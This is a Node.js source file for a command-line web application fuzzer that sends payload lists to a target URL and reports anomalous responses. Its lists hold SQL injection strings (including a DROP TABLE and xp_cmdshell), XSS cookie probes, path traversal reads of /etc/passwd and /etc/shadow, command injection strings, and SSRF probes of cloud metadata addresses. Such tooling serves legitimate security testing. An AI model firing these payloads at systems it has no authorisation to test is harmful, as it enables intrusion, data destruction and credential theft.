#!/usr/bin/env node
/**
 * Web Application Fuzzer
 * Mass fuzzing of web endpoints with various payloads
 * Inspired by massweb and similar tools
 */

import { setTimeout } from 'node:timers/promises';
import { EventEmitter } from 'node:events';

export class WebFuzzer extends EventEmitter {
  constructor(options = {}) {
    super();
    this.baseUrl = options.baseUrl || '';
    this.concurrency = options.concurrency || 5;
    this.timeout = options.timeout || 5000;
    this.delay = options.delay || 0;
    this.verbose = options.verbose || false;
    this.quiet = options.quiet || false;
    this.results = [];
    this.stats = {
      total: 0,
      success: 0,
      failed: 0,
      errors: 0,
      anomalies: 0
    };
  }

  log(message) {
    if (this.verbose) {
      console.log(message);
    }
  }

  /**
   * Perform HTTP request with timeout and error handling
   */
  async makeRequest(url, options = {}) {
    try {
      const controller = new AbortController();
      const timeoutHandle = globalThis.setTimeout(() => controller.abort(), this.timeout);

      const startTime = Date.now();
      const response = await fetch(url, {
        ...options,
        signal: controller.signal
      });

      globalThis.clearTimeout(timeoutHandle);
      const responseTime = Date.now() - startTime;
      
      const text = await response.text();
      return {
        status: response.status,
        headers: Object.fromEntries(response.headers.entries()),
        body: text,
        responseTime,
        url: response.url,
        size: text.length
      };
    } catch (error) {
      return {
        error: error.message,
        url: url,
        responseTime: 0,
        status: 0
      };
    }
  }

  /**
   * SQL Injection payloads
   */
  getSQLIPayloads() {
    return [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "' OR '1'='1' #",
      "admin' --",
      "admin' #",
      "admin'/*",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR 1=1/*",
      "') OR ('1'='1",
      "') OR ('1'='1'--",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "1' UNION SELECT NULL,NULL,NULL--",
      "' AND 1=1--",
      "' AND 1=2--",
      "1' AND '1'='1",
      "1' AND '1'='2",
      "' UNION ALL SELECT NULL--",
      "1' ORDER BY 1--",
      "1' ORDER BY 2--",
      "1' ORDER BY 3--",
      "1'; DROP TABLE users--",
      "1'; EXEC xp_cmdshell('dir')--"
    ];
  }

  /**
   * XSS payloads
   */
  getXSSPayloads() {
    return [
      "<script>alert(1)</script>",
      "<script>alert('XSS')</script>",
      "<script>alert(document.cookie)</script>",
      "<img src=x onerror=alert(1)>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<body onload=alert(1)>",
      "<iframe src=\"javascript:alert(1)\">",
      "javascript:alert(1)",
      "<input onfocus=alert(1) autofocus>",
      "<select onfocus=alert(1) autofocus>",
      "<textarea onfocus=alert(1) autofocus>",
      "<details open ontoggle=alert(1)>",
      "'\"><script>alert(1)</script>",
      "\"><script>alert(1)</script>",
      "'><script>alert(1)</script>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
      "<audio src=1 href=1 onerror=\"javascript:alert(1)\">",
      "<video src=1 href=1 onerror=\"javascript:alert(1)\">",
      "<body background=\"javascript:alert(1)\">",
      "<marquee onstart=alert(1)>",
      "<div style=\"background-image:url(javascript:alert(1))\">"
    ];
  }

  /**
   * Path traversal payloads
   */
  getPathTraversalPayloads() {
    return [
      "../",
      "../../",
      "../../../",
      "../../../../",
      "../../../../../",
      "../../../etc/passwd",
      "../../../../etc/passwd",
      "../../../../../etc/passwd",
      "..\\..\\..\\windows\\win.ini",
      "....//....//....//etc/passwd",
      "..%2f..%2f..%2fetc%2fpasswd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "/etc/passwd",
      "C:\\windows\\win.ini",
      "/etc/shadow",
      "/proc/self/environ",
      "../../../../../../proc/version",
      "/var/log/apache2/access.log"
    ];
  }

  /**
   * Command injection payloads
   */
  getCommandInjectionPayloads() {
    return [
      "; ls",
      "| ls",
      "& dir",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "& type C:\\windows\\win.ini",
      "`cat /etc/passwd`",
      "$(cat /etc/passwd)",
      "; id",
      "| id",
      "& whoami",
      "; uname -a",
      "| uname -a",
      "; pwd",
      "| pwd",
      "$(whoami)",
      "`whoami`",
      "${IFS}cat${IFS}/etc/passwd"
    ];
  }

  /**
   * SSRF payloads
   */
  getSSRFPayloads() {
    return [
      "http://localhost",
      "http://127.0.0.1",
      "http://0.0.0.0",
      "http://localhost:22",
      "http://127.0.0.1:22",
      "http://localhost:3306",
      "http://127.0.0.1:6379",
      "http://169.254.169.254",
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal",
      "file:///etc/passwd",
      "file:///C:/windows/win.ini",
      "dict://localhost:6379/info",
      "gopher://localhost:25"
    ];
  }

  /**
   * Fuzz a single endpoint with payloads
   */
  async fuzzEndpoint(url, payloads, paramName = 'q') {
    this.log(`[Fuzzing] ${url} with ${payloads.length} payloads`);
    
    const results = [];
    
    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      const testUrl = `${url}${url.includes('?') ? '&' : '?'}${paramName}=${encodeURIComponent(payload)}`;
      
      this.stats.total++;
      const response = await this.makeRequest(testUrl);
      
      const result = {
        url: testUrl,
        payload: payload,
        paramName: paramName,
        status: response.status,
        responseTime: response.responseTime,
        size: response.size,
        error: response.error
      };

      if (response.error) {
        this.stats.errors++;
        result.anomaly = true;
      } else {
        this.stats.success++;
        
        // Detect anomalies
        if (this.detectAnomaly(response, payload)) {
          this.stats.anomalies++;
          result.anomaly = true;
          result.anomalyReason = this.getAnomalyReason(response, payload);
        }
      }

      results.push(result);
      this.emit('progress', {
        current: i + 1,
        total: payloads.length,
        result: result
      });

      // Delay between requests
      if (this.delay > 0) {
        await setTimeout(this.delay);
      }
    }

    return results;
  }

  /**
   * Detect if response is anomalous
   */
  detectAnomaly(response, payload) {
    // Check for error messages
    const errorPatterns = [
      /error/i,
      /exception/i,
      /warning/i,
      /sql syntax/i,
      /mysql/i,
      /postgresql/i,
      /oracle/i,
      /fatal/i,
      /stack trace/i,
      /file not found/i,
      /access denied/i,
      /permission denied/i
    ];

    for (const pattern of errorPatterns) {
      if (pattern.test(response.body)) {
        return true;
      }
    }

    // Check if payload is reflected
    if (response.body.includes(payload)) {
      return true;
    }

    // Check for unusual status codes
    if (response.status >= 500) {
      return true;
    }

    // Check for unusually long response times (> 3 seconds)
    if (response.responseTime > 3000) {
      return true;
    }

    return false;
  }

  /**
   * Get reason for anomaly detection
   */
  getAnomalyReason(response, payload) {
    const reasons = [];

    if (response.status >= 500) {
      reasons.push('Server Error (5xx)');
    }

    if (response.body.includes(payload)) {
      reasons.push('Payload Reflected');
    }

    if (/error|exception|warning/i.test(response.body)) {
      reasons.push('Error Message Detected');
    }

    if (/sql|mysql|postgresql|oracle/i.test(response.body)) {
      reasons.push('Database Error');
    }

    if (response.responseTime > 3000) {
      reasons.push('Slow Response');
    }

    return reasons.join(', ');
  }

  /**
   * Mass fuzz multiple endpoints
   */
  async fuzzMultiple(endpoints, payloadType = 'all') {
    this.results = [];
    this.stats = {
      total: 0,
      success: 0,
      failed: 0,
      errors: 0,
      anomalies: 0
    };

    const payloadMap = {
      sqli: this.getSQLIPayloads(),
      xss: this.getXSSPayloads(),
      traversal: this.getPathTraversalPayloads(),
      cmdi: this.getCommandInjectionPayloads(),
      ssrf: this.getSSRFPayloads()
    };

    const payloads = payloadType === 'all' 
      ? Object.values(payloadMap).flat()
      : payloadMap[payloadType] || [];

    if (payloads.length === 0) {
      throw new Error(`Invalid payload type: ${payloadType}`);
    }

    if (!this.quiet) {
      console.log(`🎯 Fuzzing ${endpoints.length} endpoint(s) with ${payloads.length} payload(s)\n`);
    }

    for (const endpoint of endpoints) {
      const results = await this.fuzzEndpoint(endpoint, payloads);
      this.results.push(...results);
    }

    return this.getReport();
  }

  /**
   * Generate fuzzing report
   */
  getReport() {
    const anomalies = this.results.filter(r => r.anomaly);
    
    return {
      stats: this.stats,
      anomalies: anomalies,
      timestamp: new Date().toISOString()
    };
  }

  /**
   * Print fuzzing report
   */
  printReport(report = null) {
    const r = report || this.getReport();
    
    console.log('\n' + '='.repeat(60));
    console.log('               FUZZING REPORT');
    console.log('='.repeat(60) + '\n');
    
    console.log('Statistics:');
    console.log(`  Total Requests: ${r.stats.total}`);
    console.log(`  Successful: ${r.stats.success}`);
    console.log(`  Errors: ${r.stats.errors}`);
    console.log(`  Anomalies Detected: ${r.stats.anomalies}`);
    console.log('');

    if (r.anomalies.length === 0) {
      console.log('✅ No anomalies detected!\n');
      return;
    }

    console.log(`Found ${r.anomalies.length} anomalies:\n`);
    
    r.anomalies.forEach((anomaly, idx) => {
      console.log(`${idx + 1}. ${anomaly.url}`);
      console.log(`   Payload: ${anomaly.payload}`);
      console.log(`   Status: ${anomaly.status}`);
      console.log(`   Response Time: ${anomaly.responseTime}ms`);
      if (anomaly.anomalyReason) {
        console.log(`   Reason: ${anomaly.anomalyReason}`);
      }
      console.log('');
    });

    console.log('='.repeat(60) + '\n');
  }
}

// CLI interface
if (import.meta.url === `file://${process.argv[1]}`) {
  const args = process.argv.slice(2);
  
  if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
    console.log(`
Web Application Fuzzer

Usage:
  fuzzer.mjs <url> [options]

Options:
  --type <type>       Payload type: sqli, xss, traversal, cmdi, ssrf, all (default: all)
  --verbose, -v       Enable verbose output
  --timeout <ms>      Request timeout in milliseconds (default: 5000)
  --delay <ms>        Delay between requests in milliseconds (default: 0)
  --json              Output results as JSON

Examples:
  fuzzer.mjs http://localhost:8080/search
  fuzzer.mjs http://localhost:8080/api --type sqli --verbose
  fuzzer.mjs http://localhost:8080/file --type traversal --delay 100
`);
    process.exit(0);
  }

  const url = args[0];
  const verbose = args.includes('--verbose') || args.includes('-v');
  const json = args.includes('--json');
  
  let type = 'all';
  const typeIdx = args.findIndex(a => a === '--type');
  if (typeIdx !== -1 && args[typeIdx + 1]) {
    type = args[typeIdx + 1];
  }

  let timeout = 5000;
  const timeoutIdx = args.findIndex(a => a === '--timeout');
  if (timeoutIdx !== -1 && args[timeoutIdx + 1]) {
    timeout = parseInt(args[timeoutIdx + 1], 10);
  }

  let delay = 0;
  const delayIdx = args.findIndex(a => a === '--delay');
  if (delayIdx !== -1 && args[delayIdx + 1]) {
    delay = parseInt(args[delayIdx + 1], 10);
  }

  const fuzzer = new WebFuzzer({ baseUrl: url, verbose, timeout, delay, quiet: json });
  
  // Progress indicator
  fuzzer.on('progress', ({ current, total, result }) => {
    if (!verbose) {
      process.stdout.write(`\rProgress: ${current}/${total} requests sent...`);
    }
  });

  fuzzer.fuzzMultiple([url], type)
    .then(report => {
      if (!verbose) {
        process.stdout.write('\n');
      }
      
      if (json) {
        console.log(JSON.stringify(report, null, 2));
      } else {
        fuzzer.printReport(report);
      }
      
      // Exit with error code if anomalies found
      if (report.stats.anomalies > 0) {
        process.exit(1);
      }
    })
    .catch(error => {
      console.error('\nError during fuzzing:', error.message);
      process.exit(1);
    });
}

export default WebFuzzer;
